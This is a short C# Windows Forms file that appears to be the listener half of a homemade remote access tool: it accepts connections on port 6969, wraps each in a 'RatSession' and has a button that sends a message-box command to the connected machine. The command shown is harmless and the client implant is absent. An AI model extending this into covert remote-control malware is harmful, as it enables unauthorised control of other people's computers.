using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;

namespace Session
{
    public partial class Form1 : Form
    {
        private Session currentSession { get; set; }

        public Form1()
        {
            InitializeComponent();

            Task.Run(() =>
            {
                TcpListener listener = new TcpListener(IPAddress.Any, 6969);
                listener.Start();

                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();

                    RatSession session = new RatSession();

                    session.Start(client);

                    MessageBox.Show("connection established", "idk what to add for a title");

                    currentSession = session;
                }
            });

        }

        private void ratStart_Click(object sender, EventArgs e)
        {
            currentSession.Send("msgbox|ok|ok");
        }
    }
}
